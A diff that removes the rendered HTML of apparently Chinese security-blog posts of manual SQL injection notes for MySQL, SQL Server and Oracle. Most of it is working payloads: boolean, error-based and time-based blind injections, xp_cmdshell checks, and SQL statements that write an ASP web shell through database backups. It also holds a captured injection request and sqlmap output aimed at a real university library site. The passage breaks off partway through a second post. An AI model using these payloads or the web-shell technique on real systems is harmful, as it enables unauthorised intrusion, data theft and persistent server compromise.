@@ -259,481 +259,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/05/sql-manual-injection-referrence/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="欣海余诚's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/07/05/sql-manual-injection-referrence/" itemprop="url">SQL手注参考笔记</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-07-05T18:51:54+08:00">
-                2021-07-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">WEB安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if语句： if(1=1,1,0)</span><br><span class="line">substr(&quot;abc&quot;, 1, 1) //a</span><br><span class="line">select @@secure_file_priv; //查看文件导出权限</span><br><span class="line">&#x27;/var/lib/mysql-files/&#x27;</span><br><span class="line">select @@plugin_dir; //查看plugin目录</span><br><span class="line">&#x27;/usr/lib64/mysql/plugin/&#x27;</span><br><span class="line">select @@basedir; // 查看数据库目录</span><br></pre></td></tr></table></figure>
-
-<p>payload:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">bool型(无空格)</span><br><span class="line">1&#x27;and&#x27;y&#x27;=&#x27;f</span><br><span class="line">1&#x27;and&#x27;y&#x27;=&#x27;y</span><br><span class="line">1&#x27;and ord(mid(user(),1,1))&gt;1 and &#x27;y&#x27;=&#x27;y</span><br><span class="line">搜索型：</span><br><span class="line">%&#x27; and 1=1 and &#x27;%&#x27;=&#x27;</span><br><span class="line">%&#x27; and 1=2 and &#x27;%&#x27;=&#x27;</span><br><span class="line">报错注入</span><br><span class="line">&#x27;and/**/extractvalue(1,concat(char(126),md5(1982470395)))and&#x27;</span><br><span class="line">&#x27;and/**/extractvalue(1,concat(user()))and&#x27;</span><br><span class="line">1&#x27;and/**/updatexml(1,concat(char(126),user()),1)and&#x27;</span><br><span class="line">盲注(无空格)</span><br><span class="line">1&#x27;and(select*from(select+sleep(2))a/**/union/**/select+1)=&#x27;</span><br><span class="line">注数据库长度：</span><br><span class="line">1&#x27;and(select*from(select if(LENGTH(database())=%d,sleep(3),0))a)=&#x27;</span><br><span class="line">注数据库名：</span><br><span class="line">1&#x27;and(select*from(select if(ASCII(SUBSTR(database(),1,1))=97,sleep(3),0))a)=&#x27;&#x27;</span><br></pre></td></tr></table></figure>
-
-<h1 id="SQL-Server"><a href="#SQL-Server" class="headerlink" title="SQL Server"></a>SQL Server</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><ul>
-<li>端口号为 1433</li>
-<li>数据库后缀名 .mdf</li>
-<li>注释符 –</li>
-<li>支持堆叠查询：Y</li>
-</ul>
-<h3 id="权限"><a href="#权限" class="headerlink" title="权限"></a>权限</h3><ul>
-<li>sa权限：数据库操作，文件管理，命令执行，注册表读取等system。SQLServer数据库的最高权限</li>
-<li>db_owner权限：文件管理，数据库操作等权限 users-administrators</li>
-<li>public权限：数据库操作 guest-users</li>
-</ul>
-<h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><p>有6个默认的库，分别是4个系统数据库：</p>
-<ul>
-<li>master</li>
-<li>model</li>
-<li>msdb </li>
-<li>tempdb</li>
-</ul>
-<p>和2个其他数据库：</p>
-<ul>
-<li>ReportServer</li>
-<li>ReportServerTempDB。</li>
-</ul>
-<p>其中，model和tempdb是默认没有数据表的。</p>
-<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">select @@version;       #查询数据库的版本</span><br><span class="line">select host_name();     #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字</span><br><span class="line">select db_name();       #查询当前数据库名</span><br><span class="line">select user;            #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner </span><br><span class="line">use tempdb              #切换到tempdb表  </span><br><span class="line">top n                   #查询前n条记录</span><br><span class="line">select substring(&#x27;string&#x27;,2,1)     #截取给定字符串的索引为2的1个字符</span><br><span class="line">select ascii(&#x27;a&#x27;)                  #查询给定字符串的ascii值</span><br><span class="line">select len(&#x27;string&#x27;)               #查询给定字符串的长度</span><br><span class="line">if语句：sqlserver：if(1=1) (sql语句)   else （sql语句）</span><br><span class="line"></span><br><span class="line">#查询数据库</span><br><span class="line">select count(name) from sysdatabases     #查询数据库的个数</span><br><span class="line">select name  from sysdatabases           #查询数据库的名字</span><br><span class="line">select * from sysdatabases               #查询所有数据库的信息</span><br><span class="line"></span><br><span class="line">#查询数据表</span><br><span class="line">select * from sysobjects where type=&#x27;u&#x27;  #查询当前数据库的所有表的详细信息</span><br><span class="line">select count(name) from msdb..sysobjects where xtype=&#x27;U&#x27;  #查询指定msdb数据库中表的个数</span><br><span class="line">select name from msdb..sysobjects where xtype=&#x27;U&#x27;         #查询指定msdb数据库中表的名字</span><br><span class="line">select * from msdb..sysobjects where xtype=&#x27;U&#x27;            #查询指定msdb数据库中表的详细信息</span><br><span class="line"></span><br><span class="line">#查询列</span><br><span class="line">select name from syscolumns where id=(select max(id) from sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)           #查询当前数据库的指定users表的所有列</span><br><span class="line">select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)   #查询指定test数据库的指定users表的列的个数</span><br><span class="line">select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的所有列</span><br><span class="line">select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype=&#x27;u&#x27; and name=&#x27;users&#x27;)       #查询指定test数据库的指定users表的列的详细信息</span><br><span class="line"></span><br><span class="line">#查询数据</span><br><span class="line">select count(*) from test..user          #查询test数据库user表的数据的条数</span><br><span class="line">select * from test..user                 #查询test数据库user表的所有数据</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h3><p>手工注入payload: </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">xray检验是否存在sql注入：</span><br><span class="line">932&#x27;and/**/convert(int,sys.fn_sqlvarbasetostr(HashBytes(&#x27;MD5&#x27;,&#x27;1899274127&#x27;)))&gt;&#x27;0</span><br><span class="line"></span><br><span class="line">boolean-based blind</span><br><span class="line">Payload: centid=932&#x27; AND 6663=6663 AND &#x27;dlfS&#x27;=&#x27;dlfS</span><br><span class="line"></span><br><span class="line">error-based</span><br><span class="line">Payload: centid=932&#x27; AND 8657 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(106)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (8657=8657) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(120)+CHAR(122)+CHAR(113))) AND &#x27;YkOb&#x27;=&#x27;YkOb</span><br><span class="line">Vector: AND [RANDNUM] IN (SELECT (&#x27;[DELIMITER_START]&#x27;+([QUERY])+&#x27;[DELIMITER_STOP]&#x27;))</span><br><span class="line"></span><br><span class="line">stacked queries</span><br><span class="line">centid=932&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br><span class="line"></span><br><span class="line">time-based blind</span><br><span class="line">centid=932&#x27;;WAITFOR DELAY &#x27;0:0:5&#x27;--</span><br><span class="line">admin&#x27;and(select+1)&gt;0waitfor/**/delay&#x27;0:0:3</span><br><span class="line">admin&#x27;;waitfor/**/delay&#x27;0:0:3</span><br><span class="line"></span><br><span class="line">获取当前user</span><br><span class="line">932&#x27; and 1=(select user_name())--</span><br><span class="line">获取当前数据库</span><br><span class="line">932&#x27; and 1=(select db_name()) AND &#x27;WckB&#x27;=&#x27;WckB</span><br><span class="line"></span><br><span class="line">获取第一个数据库(dbid=1获取第一个)</span><br><span class="line">932&#x27; and 1=(select name from master.dbo.sysdatabases where dbid=1)--</span><br><span class="line">注表名</span><br><span class="line">932&#x27; and  1=(select top 1 name from where xtype=’u’)--</span><br><span class="line">注列名</span><br><span class="line">and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name=&#x27;表名&#x27;))--</span><br><span class="line">注数据</span><br><span class="line">932&#x27; and 1=(select top 1 表名 from 字段名)--</span><br><span class="line">查看是否有xp_cmdshell权限（）</span><br><span class="line">932&#x27; and 1=(Select count(*) FROM sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27;)--</span><br><span class="line">932&#x27; and 0=(Select count(*) FROM sysobjects Where xtype = &#x27;X&#x27; AND name = &#x27;xp_cmdshell&#x27;)--</span><br><span class="line">判断当前数据库用户权限</span><br><span class="line">and 1=(IS_SRVROLEMEMBER(&#x27;sysadmin&#x27;))        //返回正常为sa</span><br><span class="line">and 1=(IS_MEMBER(&#x27;db_owner&#x27;))               //返回正常为DB_OWNER</span><br><span class="line">and 1=(IS_srvrolemember(&#x27;public&#x27;))          //public权限,较低</span><br></pre></td></tr></table></figure>
-
-<h2 id="SqlServer-getshell"><a href="#SqlServer-getshell" class="headerlink" title="SqlServer getshell"></a>SqlServer getshell</h2><h3 id="LOG备份"><a href="#LOG备份" class="headerlink" title="LOG备份"></a><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_17204441/article/details/90509698">LOG备份</a></h3><p>利用条件：</p>
-<ol>
-<li>至少DBO权限</li>
-<li>前提得知绝对路径，并且可写</li>
-<li>站库不分离</li>
-<li>数据库必须被备份过一次</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">alter database test set RECOVERY FULL;</span><br><span class="line">create table dbo.test2(a image);</span><br><span class="line">insert into test..test2(a) values (0x3c256578656375746520726571756573742822786879632229253e); //&lt;%execute request(&quot;xhyc&quot;)%&gt;</span><br><span class="line">backup database test to disk=&#x27;d:\sqlserver.bak&#x27;;</span><br><span class="line">backup log test to disk=&#x27;d:\shell.asp&#x27; with init;</span><br><span class="line">drop table test..test2;</span><br></pre></td></tr></table></figure>
-
-<p>测试dbo权限写入成功：</p>
-<p><img src="mssql_log_write_shell.jpg" alt="image"></p>
-<h3 id="差异备份"><a href="#差异备份" class="headerlink" title="差异备份"></a><a target="_blank" rel="noopener" href="https://www.cnblogs.com/PANDA-Mosen/p/13283204.html">差异备份</a></h3><ol>
-<li>至少DBO权限</li>
-<li>前提知道绝对路径，路径可写。</li>
-<li>HTTP 500错误不是自定义</li>
-<li>WEB和数据在一块。还有的就是数据库中不能存在%号之类的，不然也是不成功的。</li>
-<li>数据量不能太大</li>
-</ol>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">backup database test to disk = &#x27;d:\sqlserver.bak&#x27;;</span><br><span class="line">create table test..test2(a image);</span><br><span class="line">insert into test..test2(a) values (0x3c256578656375746520726571756573742822786879632229253e); //&lt;%execute request(&quot;xhyc&quot;)%&gt;</span><br><span class="line">backup database test to disk = &#x27;D:\phpstudy_pro\WWW\shell3.asp&#x27; with differential , format;</span><br><span class="line">drop table test..test2;</span><br></pre></td></tr></table></figure>
-<p>测试dbo权限写入成功：</p>
-<p><img src="mssql_diff_write_shell.jpg" alt="image"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>Sqlserver 大于2005版本默认关闭xp_cmdshell，无法执行系统cmd命令，需要安装cmd_shell组件。</p>
-<p>db_owner、public权限提权：通过文件备份功能写入一句话木马</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/csnd/p/11807695.html">SQLServer数据库及注入方法</a></li>
-</ul>
-<h1 id="Oralce"><a href="#Oralce" class="headerlink" title="Oralce"></a>Oralce</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /middle.aspx HTTP/1.1</span><br><span class="line">Host: library.ysu.edu.cn</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0</span><br><span class="line">Content-Length: 115</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://library.ysu.edu.cn/</span><br><span class="line">Accept-Encoding: gzip</span><br><span class="line"></span><br><span class="line">number=2&#x27;/**/and/**/(select decode(length(user),5,dbms_pipe.receive_message(&#x27;RDS&#x27;,10),0) from dual)=&#x27;1&amp;passwd=admin</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; python sqlmap.py -r pack.txt -pnumber  -v --sql-shell</span><br><span class="line">select banner from sys.v_$version [2]:</span><br><span class="line">[*] Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production</span><br><span class="line">[*] PL/SQL Release 11.2.0.1.0 - Production</span><br></pre></td></tr></table></figure>
-<h2 id="基本信息-1"><a href="#基本信息-1" class="headerlink" title="基本信息"></a>基本信息</h2><ul>
-<li>Oracle不支持堆叠查询</li>
-<li>DBMS_PIPE.RECEIVE_MESSAGE函数将为从RDS管道返回的数据等待10秒。默认情况下，允许以public权限执行该包。</li>
-<li>不同于其它数据库，oracle只会安装一个数据库，但是可以创建多个用户，将用户和表对应起来。</li>
-<li>dual是一个虚拟表，用来构成select的语法规则，oracle保证dual里面永远只有一条记录。</li>
-<li>创建用户不指定表空间会把各种数据放到默认的空间里</li>
-</ul>
-<p>常用数据表：</p>
-<ul>
-<li>dba用户表：dba_users</li>
-<li>dba表空间表：dba_tablespaces</li>
-<li>版本号表：product_component_version</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\admin&gt; sqlplus</span><br><span class="line"></span><br><span class="line">SQL*Plus: Release 11.2.0.2.0 Production on 星期四 9月 24 11:54:09 2020</span><br><span class="line"></span><br><span class="line">Copyright (c) 1982, 2014, Oracle.  All rights reserved.</span><br><span class="line"></span><br><span class="line">请输入用户名:  sys as sysdba</span><br><span class="line">输入口令:</span><br><span class="line"></span><br><span class="line">连接到:</span><br><span class="line">Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production</span><br><span class="line"></span><br><span class="line">//create user xxxxx(用户名) identified by &quot;密码&quot; </span><br><span class="line">//grant dba to 用户名  --给用户赋予所有权限，connect是赋予连接数据库的权限，resource 是赋予用户只可以创建实体但是没有创建数据结构的权限。</span><br><span class="line"></span><br><span class="line">//切换用户</span><br><span class="line">SQL&gt; conn scott</span><br><span class="line">输入口令: 123456</span><br><span class="line">已连接。</span><br><span class="line"></span><br><span class="line">//查看当前用户==show user</span><br><span class="line">SQL&gt; select user from dual;  </span><br><span class="line"></span><br><span class="line">USER</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">SCOTT</span><br><span class="line"></span><br><span class="line">//查看数据库版本</span><br><span class="line">SQL&gt; select product, version from product_component_version where substr(product, 1, 6)=&#x27;Oracle&#x27;; </span><br><span class="line"></span><br><span class="line">PRODUCT</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">VERSION</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Oracle Database 11g Express Edition</span><br><span class="line">11.2.0.2.0</span><br><span class="line"></span><br><span class="line">//使用host命令可以执行系统命令</span><br><span class="line">SQL&gt; host whoami</span><br><span class="line">desktop-3o58k0a\admin</span><br><span class="line"></span><br><span class="line">//创建表</span><br><span class="line">SQL&gt; create table t_user(id number(10) primary key, name varchar2(20)); </span><br><span class="line"></span><br><span class="line">表已创建。</span><br><span class="line"></span><br><span class="line">//插入</span><br><span class="line">SQL&gt; insert into t_user(id, name) values(1, &#x27;123&#x27;); //必须是单引号？双引号就报错</span><br><span class="line"></span><br><span class="line">已创建 1 行。</span><br><span class="line"></span><br><span class="line">//有更新一定要commit</span><br><span class="line">SQL&gt;COMMIT;</span><br><span class="line"></span><br><span class="line">//查看所有表空间</span><br><span class="line">SQL&gt; select tablespace_name from dba_tablespaces;</span><br><span class="line"></span><br><span class="line">TABLESPACE_NAME</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">SYSTEM</span><br><span class="line">SYSAUX</span><br><span class="line">UNDOTBS1</span><br><span class="line">TEMP</span><br><span class="line">USERS</span><br><span class="line"></span><br><span class="line">//查看当前用户的表</span><br><span class="line">SQL&gt; select table_name from user_tables where rownum &lt; 5;</span><br><span class="line"></span><br><span class="line">TABLE_NAME</span><br><span class="line">------------------------------------------------------------</span><br><span class="line">ICOL$</span><br><span class="line">IND$</span><br><span class="line">COL$</span><br><span class="line">CLU$</span><br><span class="line"></span><br><span class="line">//延时函数dbms_pipe.receive_message：从rds（可任意命名）管道等待4秒钟</span><br><span class="line">SQL&gt; select dbms_pipe.receive_message(&#x27;rds&#x27;, 4) from dual;</span><br><span class="line"></span><br><span class="line">DBMS_PIPE.RECEIVE_MESSAGE(&#x27;RDS&#x27;,4)</span><br><span class="line">----------------------------------</span><br><span class="line">                                 1</span><br><span class="line">//查询ip地址</span><br><span class="line">SQL&gt; select utl_inaddr.get_host_address from dual;</span><br><span class="line"></span><br><span class="line">GET_HOST_ADDRESS</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">fe80::35db:b13e:5850:3ca3%3</span><br></pre></td></tr></table></figure>
-
-<h2 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">decode(条件,值1,返回值1,值2,返回值2,…值n,返回值n,缺省值) //作用与if类似</span><br><span class="line">substr(user, 1, 1)</span><br><span class="line">ascii(&#x27;a&#x27;)</span><br><span class="line">dbms_pipe.receive_message(任意管道名, 等待时间)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">time-based</span><br><span class="line">2&#x27;/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE(&#x27;f&#x27;,3)=&#x27;f</span><br><span class="line">2&#x27;/**/and/**/(select decode(length(user),6,dbms_pipe.receive_message(&#x27;RDS&#x27;,5),0) from dual)=&#x27;1</span><br><span class="line">2&#x27;/**/and/**/(select decode(ascii(substr(user,1,1)), 128, dbms_pipe.receive_message(&#x27;RDS&#x27;,5),0) from dual)=&#x27;1</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><a target="_blank" rel="noopener" href="https://redn3ck.github.io/2018/04/25/Oracle%E6%B3%A8%E5%85%A5-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-Shell%E5%8F%8D%E5%BC%B9/">Oracle注入 - 命令执行&amp;Shell反弹</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/07/05/sql-injection/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="欣海余诚's blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/07/05/sql-injection/" itemprop="url">SQL注入笔记</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-07-05T18:21:44+08:00">
-                2021-07-05
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
-                    <span itemprop="name">WEB安全</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x01-常见注入类型"><a href="#0x01-常见注入类型" class="headerlink" title="0x01 常见注入类型"></a>0x01 常见注入类型</h2><h3 id="一、带回显"><a href="#一、带回显" class="headerlink" title="一、带回显"></a>一、带回显</h3><h4 id="1-联合注入"><a href="#1-联合注入" class="headerlink" title="1. 联合注入"></a>1. 联合注入</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=1--+   ==&gt;   id=1&#x27; and 1^0--+   ==&gt;  select !0</span><br><span class="line">id=1&#x27; and 1=2--+   ==&gt;   id=1&#x27; and 1^1--+   ==&gt;</span><br><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">1&#x27; --+</span><br><span class="line">1&#x27; order by 2 -- -</span><br><span class="line">1&#x27; union select 1,2-- -</span><br><span class="line">注表名</span><br><span class="line">1&#x27; union select database(), group_concat(table_name) from information_schema.tables where table_schema=database()-- -</span><br><span class="line">注列名：</span><br><span class="line">1&#x27; union select table_name, group_concat(column_name) from information_schema.columns where table_name=&#x27;xxx&#x27;-- -;</span><br><span class="line"> select !1</span><br><span class="line">//注flag：</span><br><span class="line">id=-1&#x27;%20union%20select%201,username,password%20from%20security.users--+</span><br></pre></td></tr></table></figure>
-<h4 id="2-报错注入"><a href="#2-报错注入" class="headerlink" title="2.报错注入"></a>2.报错注入</h4><ol>
-<li><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/e097a1c0d9ef">双查询注入(Duplicate entry报错)</a></p>
- <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,count(*),concat_ws(&#x27;:&#x27;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),floor(rand()*2)) as a from information_schema.tables group by a --+</span><br></pre></td></tr></table></figure>
-<blockquote>
-<p>group by floor(random(0)*2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0)*2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p>
